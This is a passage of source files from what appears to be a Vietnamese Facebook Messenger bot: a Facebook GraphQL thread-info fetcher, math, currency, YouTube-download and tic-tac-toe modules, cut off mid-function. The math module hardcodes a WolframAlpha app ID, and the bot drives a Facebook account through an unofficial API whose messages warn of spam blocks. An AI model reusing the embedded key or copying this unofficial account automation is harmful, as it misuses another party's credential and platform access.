messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nconst MAX_ARRAY_LENGTH = 6; //safe \nvar Request_Update_Time = 0;\nvar updateInterval;\nvar updateTimeout;\nlet Queues = [];\n\nlet onetimecook = false\n\nfunction addToQueues(num) {\n  const existingArray = Queues.some(subArr => subArr.some(obj => obj.threadID == num.threadID));\n\n  if (!existingArray) {\n    if (Queues.length > 0 && Queues[Queues.length - 1].length === MAX_ARRAY_LENGTH) {\n      Queues.push([num]);\n    } else {\n      const lastArray = Queues.length > 0 ? Queues[Queues.length - 1] : [];\n      lastArray.push(num);\n\n      if (Queues.length === 0) {\n        Queues.push(lastArray);\n      }\n    }\n  }\n}\n\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  var { createData,getData,hasData,updateData, getAll } = require('../Extra/ExtraGetThread');\n  var Database = require('../Extra/Database');\n  \n  return async function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n    \n    if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n\n    if (utils.getType(global.Fca.Data.Userinfo) == \"Array\" || global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = new Map();\n\n    const updateUserInfo = (threadInfo) => {\n      if (!global.Fca.Data.Userinfo) {\n        global.Fca.Data.Userinfo = new Map();\n      }\n    \n      threadInfo.forEach(thread => {\n        const userInfo = thread.userInfo;\n    \n        if (Array.isArray(userInfo)) {\n          const userInfoMap = new Map(userInfo.map(user => [user.id, user]));\n          for (const [id, user] of userInfoMap) {\n            global.Fca.Data.Userinfo.set(id, user);\n          }\n        }\n      });\n    };\n  \n  const getMultiInfo = async function (threadIDs) {\n      let form = {};\n      let tempThreadInf = [];\n          threadIDs.forEach((x,y) => {\n              form[\"o\" + y] = {\n                  doc_id: \"3449967031715030\",\n                  query_params: { id: x, message_limit: 0, load_messages: false, load_read_receipts: false, before: null }\n              }; \n          });\n      let Submit = { queries: JSON.stringify(form), batch_name: \"MessengerGraphQLThreadFetcher\" };\n          \n      const promise = new Promise((resolve, reject) => {\n          defaultFuncs.post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, Submit)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(resData => {\n              if (resData.error || resData[resData.length - 1].error_results !== 0) throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n                  resData = resData.slice(0, -1).sort((a, b) => Object.keys(a)[0].localeCompare(Object.keys(b)[0]));\n                  resData.forEach((x, y) => tempThreadInf.push(formatThreadGraphQLResponse(x[\"o\" + y].data)));\n                  return resolve({\n                      Success: true,\n                      Data: tempThreadInf\n                  });\n          })\n          .catch(() => { \n              reject({ Success: false, Data: '' }) \n          });\n      })\n  \n      return await promise;\n  }\n  \n  const formatAndUpdateData = (AllThreadInfo) => {\n      try {\n          AllThreadInfo.forEach(threadInf => { updateData(threadInf.threadID, threadInf); })\n          updateUserInfo(AllThreadInfo) // [ {}, {} ]\n  \n      } catch (e) {\n          console.log(e);\n      }\n  }\n\n  const formatAndCreateData = (AllThreadInfo) => {\n    try {\n        AllThreadInfo.forEach(threadInf => { createData(threadInf.threadID, threadInf); })\n        updateUserInfo(AllThreadInfo) // [ {}, {} ]\n\n    } catch (e) {\n        console.log(e);\n    }\n}\n  \n  const checkAverageStaticTimestamp = function (avgTimeStamp) {\n    const DEFAULT_UPDATE_TIME = 900 * 1000; //th·ªùi gian c·∫≠p nh·∫≠t t·ªëi ƒëa + v·ªõi th·ªùi gian trung b√¨nh c·ªßa t·ªïng request 1 m·∫£ng\n    //khi request ph√∫t th·ª© 3, 1 req ·ªü ph√∫t th·ª© 7, 1 req ·ªü ph√∫t th·ª© 10, v·∫≠y trung b√¨nh l√† (3+7+1) / time.length (3) + v·ªõi 15p = tg trung b√¨nh ƒë·ªÉ c·∫≠p nh·∫≠t 1 m·∫£ng\n    const MAXIMUM_ERROR_TIME = 10 * 1000;\n    return { //khi check = false th√¨ c·∫ßn c·∫≠p nh·∫≠t v√¨ ƒë√£ h∆°n th·ªùi gian tb + 15p\n        Check:  (parseInt(avgTimeStamp) + parseInt(DEFAULT_UPDATE_TIME)) + parseInt(MAXIMUM_ERROR_TIME) >= Date.now(), // ·ªü ƒë√¢y avgTimeStamp l√† th·ªùi gian c·ªë ƒë·ªãnh c·ªßa 1 m·∫£ng queue khi ƒë·∫ßy \n        timeLeft: (parseInt(avgTimeStamp) + parseInt(DEFAULT_UPDATE_TIME)) - Date.now() + parseInt(MAXIMUM_ERROR_TIME)\n    }\n  }\n  \n  const autoCheckAndUpdateRecallTime = () => {\n      let holdTime = [];\n      let oneTimeCall = false;\n      //l·∫•y t·∫•t c·∫£ trung b√¨nh th·ªùi gian c·ªßa t·∫•t c·∫£ m·∫£ng v√† t√¨m th·ªùi gian c√≤n l·∫°i ng·∫Øn nh·∫•t, n·∫øu c√≥ s·∫µn id c·∫ßn c·∫≠p nh·∫≠t th√¨ c·∫≠p nh·∫≠t ng√†y l·∫≠p t·ª©c\n      Queues.forEach((i, index) => {\n          // [ { threadID, TimeCreate }, {} ]\n          const averageTimestamp = Math.round(i.reduce((acc, obj) => acc + obj.TimeCreate, 0) / i.length);\n          const DataAvg = checkAverageStaticTimestamp(averageTimestamp);\n          if (DataAvg.Check) {\n            //c·∫ßn ch·ªù\n             // holdTime.push(DataAvg.timeLeft);\n             //cho thi cho 10s sau check lai roi cho tiep nhe =))\n          }\n          else {\n            oneTimeCall = true;\n          }\n      });\n\n      if (oneTimeCall) autoUpdateData(); // c·∫≠p nh·∫≠t ngay, nhin la biet tot hon hold roi =))\n\n      // if (holdTime.length >= 1) {\n      //     holdTime.sort((a,b) => a - b) //low to high time\n      //     if (holdTime[0] > Request_Update_Time) {\n      //         Request_Update_Time = holdTime[0];\n      //         clearInterval(updateInterval);\n      //         updateInterval = setInterval(() => { autoUpdateData(); }, holdTime[0])\n      //     }\n      // }\n\n      //hold lam cai cho gi khi ta co check lien tuc 10s 1 lan üòî\n\n      const MAXIMUM_RECALL_TIME = 30 * 1000;\n      clearTimeout(updateTimeout);\n      updateTimeout = setTimeout(() => { autoCheckAndUpdateRecallTime(); }, MAXIMUM_RECALL_TIME)\n  }\n  \n  const autoUpdateData = async function() {\n      //[ [ {}, {} ], [ {}, {}  ] ]\n      let doUpdate = [];\n      let holdTime = [];\n  \n      Queues.forEach((i, index) => {\n          // [ {}, {} ]\n          const averageTimestamp = Math.round(i.reduce((acc, obj) => acc + obj.TimeCreate, 0) / i.length);\n          // th·ªùi gian trung b√¨nh c·ªßa 1 m·∫£ng t·ª´ l√∫c b·∫Øt ƒë·∫ßu request l·∫ßn ƒë·∫ßu, c·∫ßn + th√™m th·ªùi gian c·ªë ƒë·ªãnh l√† 15p !\n  \n          const DataAvg = checkAverageStaticTimestamp(averageTimestamp)\n          if (DataAvg.Check) {\n              // ch·ªù ti·∫øp\n          }\n          else {\n            // ƒë√£ h∆°n th·ªùi gian 15p\n              doUpdate.push(i) // [ {}, {} ]\n              Queues.splice(index, 1); //ƒë·∫°t ƒëi·ªÅu ki·ªán n√™n xo√° ƒë·ªÉ t√Ω n√≥ t·ª± th√™m üíÄ\n          }\n  \n      });\n  \n      if (doUpdate.length >= 1) {\n          // maybe [ [ {}, {} ] [ {}, {} ] ]\n          let ids = []; // [ id, id ]\n          doUpdate.forEach(i => {\n              //[ {} {} ]\n              const onlyThreadID = [...new Set(i.map(obj => obj.threadID))]; // [ id1, id2 ]\n              ids.push(onlyThreadID) //[ [ id1, id2 ] ]\n          })\n  \n          // [ [ id1, id2 ],[ id1, id2 ] ] 5 per arr\n  \n          ids.forEach(async function(i) {\n              const dataResp = await getMultiInfo(i);\n              if (dataResp.Success == true) {\n                  let MultiThread = dataResp.Data;\n                  formatAndUpdateData(MultiThread)\n              }\n              else {\n                  global.Fca.Require.logger.Warning('CANT NOT GET THREADINFO üíÄ MAYBE U HAS BEEN BLOCKED FROM FACEBOOK');\n              }\n          })\n      }\n  }\n  \n  const createOrTakeDataFromDatabase = async (threadIDs) => {\n      let inDb = []; //NOTE: x·ª≠ l√Ω resp th√†nh 1 m·∫£ng n·∫øu c√≥ nhi·ªÅu h∆°n 1 threadID v√† obj n·∫øu 1 threadID\n      let inFastArr = [];\n      let createNow = [];\n      let cbThreadInfos = [];\n      // ki·ªÉm tra v√† ph√¢n ra 2 lo·∫°i 1 l√† ch∆∞a  c√≥ 2 l√† c√≥ =))\n      // ki·ªÉm tra\n  \n      threadIDs.forEach(id => {\n          // id, id ,id\n          hasData(id) == true ? inDb.push(id) : createNow.push(id)\n      });\n\n      if (inDb.length >= 1) {\n          let threadInfos = inDb.map(id => getData(id));\n          cbThreadInfos = cbThreadInfos.concat(threadInfos);\n          updateUserInfo(threadInfos);\n  \n          //request update queue\n          threadInfos.forEach(i => addToQueues({ threadID: i.threadID, TimeCreate: Date.now() }));\n      }\n      if (createNow.length >= 1) {\n          //5 data per chunk []\n          const chunkSize = 5;\n          const totalChunk = []; // [ [ id, id ], [ id,id ] ]\n          \n          for (let i = 0; i < createNow.length; i += chunkSize) {\n            const chunk = createNow.slice(i, i + chunkSize);\n            totalChunk.push(chunk);\n          }\n  \n          for (let i of totalChunk) {\n              //i = [ id,id ]\n              const newThreadInf = await getMultiInfo(i); // always [ {} ] or [ {}, {} ]\n              if (newThreadInf.Success == true) {\n                let MultiThread = newThreadInf.Data;  \n                formatAndCreateData(MultiThread)\n                cbThreadInfos = cbThreadInfos.concat(MultiThread)\n    \n                //request update queue\n                MultiThread.forEach(i => addToQueues({ threadID: i.threadID, TimeCreate: Date.now() }));\n            }\n            else {\n                global.Fca.Require.logger.Warning('CANT NOT GET THREADINFO üíÄ MAYBE U HAS BEEN BLOCKED FROM FACEBOOK');\n            }\n          } \n      }\n      return cbThreadInfos.length == 1 ? callback(null, cbThreadInfos[0]) : callback(null, cbThreadInfos)\n  }\n\n    if (global.Fca.Data.Already != true) {\n      global.Fca.Data.Already = true;\n      autoCheckAndUpdateRecallTime(); \n      setInterval(function(){ \n        const MapToArray = Array.from(global.Fca.Data.Userinfo, ([name, value]) => (value));\n        Database(true).set('UserInfo', MapToArray); \n      }, 420 * 1000); \n    } \n\n    await createOrTakeDataFromDatabase(threadID);\n    \n    return returnPromise;\n  };\n};","path":null,"size_bytes":15928,"size_tokens":null},"modules/commands/math.js":{"content":"module.exports.config = {\n\tname: \"math\",\n\tversion: \"1.0.1\",\n\thasPermssion: 0,\n\tcredits: \"Mirai Team\",\n\tdescription: \"L√†m to√°n\",\n\tcommandCategory: \"C√¥ng c·ª•\",\n\tusages: \"math 1 + 2\",\n\tcooldowns: 5,\n\tdependencies: {\n\t\t\"axios\": \"\",\n\t\t\"fs-extra\": \"\"\n\t},\n\tinfo: [\n\t\t{\n\t\t\tkey: 'none',\n\t\t\tprompt: '',\n\t\t\ttype: 'Ph√©p to√°n',\n\t\t\texample: 'math x+1=2'\n\t\t},\n\t\t{\n\t\t\tkey: '-p',\n\t\t\tprompt: 'Nguy√™n H√†m',\n\t\t\ttype: 'Ph∆∞∆°ng tr√¨nh',\n\t\t\texample: 'math -p xdx'\n\t\t},\n\t\t{\n\t\t\tkey: '-p',\n\t\t\tprompt: 'T√≠ch Ph√¢n',\n\t\t\ttype: 'Ph∆∞∆°ng tr√¨nh',\n\t\t\texample: 'math -p xdx from 0 to 2'\n\t\t},\n\t\t{\n\t\t\tkey: '-g',\n\t\t\tprompt: 'ƒê·ªì Th·ªã',\n\t\t\ttype: 'Ph∆∞∆°ng tr√¨nh',\n\t\t\texample: 'math -g y = x^3 - 9'\n\t\t},\n\t\t{\n\t\t\tkey: '-v',\n\t\t\tprompt: 'Vector',\n\t\t\ttype: 'T·ªça ƒë·ªô vector',\n\t\t\texample: 'math -v (1, 2, 3) - (5, 6, 7)'\n\t\t}\n\t],\n\tenvConfig: {\n\t\t\"WOLFRAM\": \"T8J8YV-H265UQ762K\"\n\t}\n};\nmodule.exports.run = async function ({ api, event, args }) {\n\tvar axios = global.nodemodule[\"axios\"];\n\tvar fs = global.nodemodule[\"fs-extra\"];\n\tvar { threadID, messageID } = event;\n\tvar out = (msg) => api.sendMessage(msg, threadID, messageID);\n\tvar text = [], key = global.configModule.math.WOLFRAM;\n\tvar content = (event.type == 'message_reply') ? event.messageReply.body : args.join(\" \");\n\tif (!content) return out(\"Vui l√≤ng nh·∫≠p ph√©p t√≠nh\");\n\telse if (content.indexOf(\"-p\") == 0) {\n\t\ttry {\n\t\t\tcontent = \"primitive \" + content.slice(3, content.length);\n\t\t\tvar data = (await axios.get(`http://api.wolframalpha.com/v2/query?appid=${key}&input=${encodeURIComponent(content)}&output=json`)).data;\n\t\t\tif (content.includes(\"from\") && content.includes(\"to\")) {\n\t\t\t\tvar value = data.queryresult.pods.find(e => e.id == \"Input\").subpods[0].plaintext;\n\t\t\t\tif (value.includes(\"‚âà\")) {\n\t\t\t\t\tvar a = value.split(\"‚âà\"), b = a[0].split(\" = \")[1], c = a[1];\n\t\t\t\t\treturn out(`Fractional: ${b}\\nDecimal: ${c}`);\n\t\t\t\t}\n\t\t\t\telse return out(value.split(\" = \")[1]);\n\t\t\t}\n\t\t\telse return out((data.queryresult.pods.find(e => e.id == \"IndefiniteIntegral\").subpods[0].plaintext.split(\" = \")[1]).replace(\"+ constant\", \"\"));\n\t\t}\n\t\tcatch (e) {\n\t\t\tout(`${e}`);\n\t\t}\n\t}\n\telse if (content.indexOf(\"-g\") == 0) {\n\t\ttry {\n\t\t\tcontent = \"plot \" + content.slice(3, content.length);\n\t\t\tvar data = (await axios.get(`http://api.wolframalpha.com/v2/query?appid=${key}&input=${encodeURIComponent(content)}&output=json`)).data;\n\t\t\tvar src = (data.queryresult.pods.some(e => e.id == \"Plot\")) ? data.queryresult.pods.find(e => e.id == \"Plot\").subpods[0].img.src : data.queryresult.pods.find(e => e.id == \"ImplicitPlot\").subpods[0].img.src;\n\t\t\tvar img = (await axios.get(src, { responseType: 'stream' })).data;\n\t\t\timg.pipe(fs.createWriteStream(\"./graph.png\")).on(\"close\", () => api.sendMessage({ attachment: fs.createReadStream(\"./graph.png\") }, threadID, () => fs.unlinkSync(\"./graph.png\"), messageID));\n\t\t}\n\t\tcatch (e) {\n\t\t\tout(`${e}`);\n\t\t}\n\t}\n\telse if (content.indexOf(\"-v\") == 0) {\n\t\ttry {\n\t\t\tcontent = \"vector \" + content.slice(3, content.length).replace(/\\(/g, \"<\").replace(/\\)/g, \">\");\n\t\t\tvar data = (await axios.get(`http://api.wolframalpha.com/v2/query?appid=${key}&input=${encodeURIComponent(content)}&output=json`)).data;\n\t\t\tvar src = data.queryresult.pods.find(e => e.id == \"VectorPlot\").subpods[0].img.src;\n\t\t\tvar vector_length = data.queryresult.pods.find(e => e.id == \"VectorLength\").subpods[0].plaintext, result;\n\t\t\tif (data.queryresult.pods.some(e => e.id == \"Result\")) result = data.queryresult.pods.find(e => e.id == \"Result\").subpods[0].plaintext;\n\t\t\tvar img = (await axios.get(src, { responseType: 'stream' })).data;\n\t\t\timg.pipe(fs.createWriteStream(\"./graph.png\")).on(\"close\", () => api.sendMessage({ body: (!result) ? '' : result + \"\\nVector Length: \" + vector_length, attachment: fs.createReadStream(\"./graph.png\") }, threadID, () => fs.unlinkSync(\"./graph.png\"), messageID));\n\t\t}\n\t\tcatch (e) {\n\t\t\tout(`${e}`);\n\t\t}\n\t}\n\telse {\n\t\ttry {\n\t\t\tvar data = (await axios.get(`http://api.wolframalpha.com/v2/query?appid=${key}&input=${encodeURIComponent(content)}&output=json`)).data;\n\t\t\tif (data.queryresult.pods.some(e => e.id == \"Solution\")) {\n\t\t\t\tvar value = data.queryresult.pods.find(e => e.id == \"Solution\");\n\t\t\t\tfor (let e of value.subpods) text.push(e.plaintext);\n\t\t\t\treturn out(text.join(\"\\n\"));\n\t\t\t}\n\t\t\telse if (data.queryresult.pods.some(e => e.id == \"ComplexSolution\")) {\n\t\t\t\tvar value = data.queryresult.pods.find(e => e.id == \"ComplexSolution\");\n\t\t\t\tfor (let e of value.subpods) text.push(e.plaintext);\n\t\t\t\treturn out(text.join(\"\\n\"));\n\t\t\t}\n\t\t\telse if (data.queryresult.pods.some(e => e.id == \"Result\")) return out(data.queryresult.pods.find(e => e.id == \"Result\").subpods[0].plaintext);\n\t\t}\n\t\tcatch (e) {\n\t\t\tout(`${e}`);\n\t\t}\n\t}\n}","path":null,"size_bytes":4674,"size_tokens":null},"includes/database/models/currencies.js":{"content":"module.exports = function({ sequelize, Sequelize }) {\r\n\tlet Currencies = sequelize.define('Currencies', {\r\n\t\tnum: {\r\n\t\t\ttype: Sequelize.INTEGER,\r\n\t\t\tprimaryKey: true,\r\n\t\t\tautoIncrement: true\r\n\t\t},\r\n\t\tuserID: {\r\n\t\t\ttype: Sequelize.BIGINT,\r\n\t\t\tunique: true\r\n\t\t},\r\n\t\tmoney: {\r\n\t\t\ttype: Sequelize.BIGINT,\r\n\t\t\tdefaultValue: 0\r\n\t\t},\r\n        exp: {\r\n            type: Sequelize.BIGINT,\r\n            defaultValue: 0\r\n        },\r\n\t\tdata: {\r\n\t\t\ttype: Sequelize.JSON\r\n\t\t}\r\n\t});\r\n\r\n\treturn Currencies;\r\n}","path":null,"size_bytes":493,"size_tokens":null},"modules/commands/sing.js":{"content":"const fs = require('fs-extra');\nconst ytdl = require('@distube/ytdl-core');\n\nasync function downloadMusicFromYoutube(link, path) {\n    var timestart = Date.now();\n    if (!link) return 'Thi·∫øu link';\n\n    return new Promise((resolve, reject) => {\n        ytdl(link, {\n            filter: format =>\n                format.quality === 'tiny' && format.audioBitrate === 48 && format.hasAudio === true\n        })\n            .pipe(fs.createWriteStream(path))\n            .on(\"close\", async () => {\n                try {\n                    var data = await ytdl.getInfo(link);\n                    var result = {\n                        title: data.videoDetails.title,\n                        dur: Number(data.videoDetails.lengthSeconds),\n                        viewCount: data.videoDetails.viewCount,\n                        likes: data.videoDetails.likes,\n                        author: data.videoDetails.author.name,\n                        timestart: timestart\n                    };\n                    resolve(result);\n                } catch (err) {\n                    reject(err);\n                }\n            })\n            .on(\"error\", reject);\n    });\n}\n\nmodule.exports.config = {\n    name: \"sing\",\n    version: \"1.1.0\",\n    hasPermssion: 0,\n    credits: \"D-Jukie (mod t√°ch tin nh·∫Øn: GPT-5)\",\n    description: \"Ph√°t nh·∫°c th√¥ng qua link YouTube ho·∫∑c t·ª´ kho√° t√¨m ki·∫øm\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"[searchMusic]\",\n    cooldowns: 0\n};\n\nmodule.exports.handleReply = async function ({ api, event, handleReply }) {\n    const moment = require(\"moment-timezone\");\n    var timeNow = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:ss\");\n\n    try {\n        var path = `${__dirname}/cache/sing-${event.senderID}.mp3`;\n        var data = await downloadMusicFromYoutube('https://www.youtube.com/watch?v=' + handleReply.link[event.body - 1], path);\n\n        if (fs.statSync(path).size > 26214400) {\n            return api.sendMessage('‚ùé Kh√¥ng th·ªÉ g·ª≠i file v√¨ dung l∆∞·ª£ng l·ªõn h∆°n 25MB.', event.threadID, () => fs.unlinkSync(path), event.messageID);\n        }\n\n        api.unsendMessage(handleReply.messageID);\n\n        // Text reply tr·ª±c ti·∫øp v√†o l·ª±a ch·ªçn\n        api.sendMessage(\n            `==== „Äé ùêíùêàùêçùêÜ ùêòùêéùêîùêìùêîùêÅùêÑ „Äè ====\\n\\n‚Üí Title: ${data.title}\\n‚Üí Th·ªùi l∆∞·ª£ng: ${this.convertHMS(data.dur)}\\n‚Üí T√™n k√™nh: ${data.author}\\n‚Üí S·ªë view: ${data.viewCount}\\n‚Üí Th·ªùi gian x·ª≠ l√Ω: ${Math.floor((Date.now() - data.timestart) / 1000)} gi√¢y\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n=== „Äé ùòõùò¢ùòµùò¥ùò∂ùò†ùòõùòâüí§ „Äè ===\\n\\n===„Äå${timeNow}„Äç===`,\n            event.threadID,\n            () => {\n                // Sau ƒë√≥ m·ªõi g·ª≠i nh·∫°c (kh√¥ng reply g√¨ c·∫£)\n                api.sendMessage(\n                    { attachment: fs.createReadStream(path) },\n                    event.threadID,\n                    () => fs.unlinkSync(path)\n                );\n            },\n            event.messageID // reply text v√†o tin nh·∫Øn l·ª±a ch·ªçn\n        );\n\n    } catch (e) {\n        console.log(\"Error in handleReply:\", e);\n        return api.sendMessage('‚ùé ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i!\\n' + e, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.convertHMS = function (value) {\n    const sec = parseInt(value, 10);\n    let hours = Math.floor(sec / 3600);\n    let minutes = Math.floor((sec - (hours * 3600)) / 60);\n    let seconds = sec - (hours * 3600) - (minutes * 60);\n    if (hours < 10) hours = \"0\" + hours;\n    if (minutes < 10) minutes = \"0\" + minutes;\n    if (seconds < 10) seconds = \"0\" + seconds;\n    return (hours !== '00' ? hours + ':' : '') + minutes + ':' + seconds;\n};\n\nmodule.exports.run = async function ({ api, event, args }) {\n    const moment = require(\"moment-timezone\");\n    var timeNow = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:ss\");\n\n    if (args.length === 0) return api.sendMessage('‚ùé Ph·∫ßn t√¨m ki·∫øm kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng!', event.threadID, event.messageID);\n\n    const keywordSearch = args.join(\" \");\n    var path = `${__dirname}/cache/sing-${event.senderID}.mp3`;\n    if (fs.existsSync(path)) fs.unlinkSync(path);\n\n    if (args.join(\" \").indexOf(\"https://\") === 0) {\n        try {\n            var data = await downloadMusicFromYoutube(args.join(\" \"), path);\n            if (fs.statSync(path).size > 26214400) return api.sendMessage('‚ùé Kh√¥ng th·ªÉ g·ª≠i file v√¨ dung l∆∞·ª£ng l·ªõn h∆°n 25MB.', event.threadID, () => fs.unlinkSync(path), event.messageID);\n\n            // G·ª≠i text tr∆∞·ªõc\n            api.sendMessage(\n                `==== „Äé ùêíùêàùêçùêÜ ùêòùêéùêîùêìùêîùêÅùêÑ „Äè ====\\n\\n‚Üí Title: ${data.title}\\n‚Üí Th·ªùi l∆∞·ª£ng: ${this.convertHMS(data.dur)}\\n‚Üí T√™n k√™nh: ${data.author}\\n‚Üí S·ªë view: ${data.viewCount}\\n‚Üí Th·ªùi gian x·ª≠ l√Ω: ${Math.floor((Date.now() - data.timestart) / 1000)} gi√¢y\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n=== „Äé ùòõùò¢ùòµùò¥ùò∂ùò†ùòõùòâüí§ „Äè ===\\n\\n===„Äå${timeNow}„Äç===`,\n                event.threadID,\n                () => {\n                    // Sau ƒë√≥ m·ªõi g·ª≠i nh·∫°c\n                    api.sendMessage(\n                        { attachment: fs.createReadStream(path) },\n                        event.threadID,\n                        () => fs.unlinkSync(path),\n                        event.messageID\n                    );\n                }\n            );\n\n        } catch (e) {\n            console.log(\"Error in run:\", e);\n            return api.sendMessage('‚ùé ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i!\\n' + e, event.threadID, event.messageID);\n        }\n    } else {\n        try {\n            const Youtube = require('youtube-search-api');\n            var link = [], msg = \"\", num = 0;\n            var data = (await Youtube.GetListByKeyword(keywordSearch, false, 10)).items;\n            for (let value of data) {\n                link.push(value.id);\n                num++;\n                msg += `${num}. üé¨ ${value.title}\\n‚è∞ ${value.length.simpleText}\\n\\n`;\n            }\n            var body = `üîé C√≥ ${link.length} k·∫øt qu·∫£ tr√πng v·ªõi t·ª´ kho√° t√¨m ki·∫øm:\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n\\n${msg}\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n\\nüëâ Reply ƒë·ªÉ ch·ªçn b√†i h√°t\\n\\n===„Äå${timeNow}„Äç===`;\n\n            return api.sendMessage(\n                body,\n                event.threadID,\n                (error, info) => {\n                    global.client.handleReply.push({\n                        type: 'reply',\n                        name: this.config.name,\n                        messageID: info.messageID,\n                        author: event.senderID,\n                        link\n                    });\n                },\n                event.messageID\n            );\n        } catch (e) {\n            console.log(\"Error in search:\", e);\n            return api.sendMessage('‚ùé ƒê√£ x·∫£y ra l·ªói khi t√¨m ki·∫øm!\\n' + e, event.threadID, event.messageID);\n        }\n    }\n};\n","path":null,"size_bytes":7041,"size_tokens":null},"modules/commands/ttt.js":{"content":"module.exports.config = {\n  name: \"ttt\",\n  version: \"1.0.1\",\n  hasPermssion: 0,\n  credits: \"Mirai Team\",\n  description: \"Play caro with AI\",\n  commandCategory: \"Tr√≤ Ch∆°i\",\n  usages: \"ttt\",\n  cooldowns: 5,\n  usages: \"x/o/delete/continue\"\n};\n\nvar AIMove;\nconst fs = require(\"fs\");\nconst { loadImage, createCanvas } = require(\"canvas\");\n\nfunction startBoard({isX, data}) {\n  data.board = new Array(3);\n  data.isX = isX;\n  data.gameOn = true;\n  data.gameOver = false;\n  data.available = [];\n  for(var i = 0; i < 3; i++) data.board[i] = new Array(3).fill(0);\n  return data;\n}\n\nasync function displayBoard(data) {\n  const path = __dirname + \"/cache/ttt.png\";\n  let canvas = createCanvas(1200, 1200);\n  let cc = canvas.getContext(\"2d\");\n  let background = await loadImage(\"https://i.postimg.cc/nhDWmj1h/background.png\");\n  cc.drawImage(background, 0, 0, 1200, 1200);\n  var quanO = await loadImage(\"https://i.postimg.cc/rFP6xLXQ/O.png\");\n  var quanX = await loadImage(\"https://i.postimg.cc/HLbFqcJh/X.png\");\n  for (var i = 0; i < 3; i++) {\n    for (var j = 0; j < 3; j++) {\n      var temp = data.board[i][j].toString();\n      var x = 54 + 366*j;\n      var y = 54 + 366*i;\n      if (temp == \"1\") if (data.isX) { cc.drawImage(quanO, x, y, 360, 360) } else cc.drawImage(quanX, x, y, 360, 360);\n      if (temp == \"2\") if (data.isX) { cc.drawImage(quanX, x, y, 360, 360) } else cc.drawImage(quanO, x, y, 360, 360);\n    }\n  }\n  var ketqua = [];\n  fs.writeFileSync(path, canvas.toBuffer(\"image/png\"));\n  ketqua.push(fs.createReadStream(path));\n  return ketqua;\n}\n\nfunction checkAIWon(data) {\n  if(data.board[0][0] == data.board[1][1] && data.board[0][0] == data.board[2][2] && data.board[0][0] == 1) return true;\n  if(data.board[0][2] == data.board[1][1] && data.board[0][2] == data.board[2][0] && data.board[0][2] == 1) return true;   \n  for(var i = 0; i < 3; ++i) {\n    if(data.board[i][0] == data.board[i][1] && data.board[i][0] == data.board[i][2] && data.board[i][0] == 1) return true;\n    if(data.board[0][i] == data.board[1][i] && data.board[0][i] == data.board[2][i] && data.board[0][i] == 1) return true;\n  }\n  return false;\n}\n\nfunction checkPlayerWon(data) {\n  if(data.board[0][0] == data.board[1][1] && data.board[0][0] == data.board[2][2] && data.board[0][0] == 2) return true;\n  if(data.board[0][2] == data.board[1][1] && data.board[0][2] == data.board[2][0] && data.board[0][2] == 2) return true;   \n  for(var i = 0; i < 3; ++i) {\n    if(data.board[i][0] == data.board[i][1] && data.board[i][0] == data.board[i][2] && data.board[i][0] == 2) return true;\n    